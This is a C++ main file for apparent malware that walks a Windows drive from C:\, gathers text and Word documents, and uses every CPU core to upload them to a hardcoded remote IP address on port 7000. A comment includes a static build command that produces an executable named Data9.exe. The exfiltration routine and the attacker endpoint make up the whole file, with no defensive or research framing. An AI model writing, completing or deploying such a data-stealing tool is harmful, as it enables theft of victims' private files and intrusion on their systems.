#include <iostream>
#include <thread>
#include <vector>
#include "gatherer.h"
#include "exfiltrator.h"

int main() {
    std::string directoryPath = "C:\\";                  // Starting directory
    std::string targetURL = "http://64.94.85.32:7000"; // Replace with your server URL
    int threadCount = std::thread::hardware_concurrency();    // Use all available cores
//g++ -o Data9.exe main.cpp exfiltrator.cpp gatherer.cpp -Iinclude -static -std=c++17 -lws2_32 -pthread
    std::cout << "[INFO] Starting recursive file exfiltration process with " << threadCount << " threads..." << std::endl;

    // Start file gathering
    std::vector<std::string> textExtensions = {".txt", ".doc", ".docx"};
    std::vector<std::string> imageExtensions = {".png", ".jpg", ".jpeg"};
    std::vector<std::string> videoExtensions = {".mp4", ".avi", ".mkv"};

    std::thread gatherer(gatherFiles, directoryPath, textExtensions);

    // Start exfiltration threads
    std::vector<std::thread> workers;
    for (int i = 0; i < threadCount; ++i) {
        workers.emplace_back(exfiltrateFile, targetURL);
    }

    gatherer.join();
    {
        std::lock_guard<std::mutex> lock(exfilMutex);
        doneGathering = true;
    }
    cv.notify_all();

    for (auto& worker : workers) {
        if (worker.joinable()) {
            worker.join();
        }
    }

    std::cout << "[INFO] File exfiltration process completed." << std::endl;
    return 0;
}
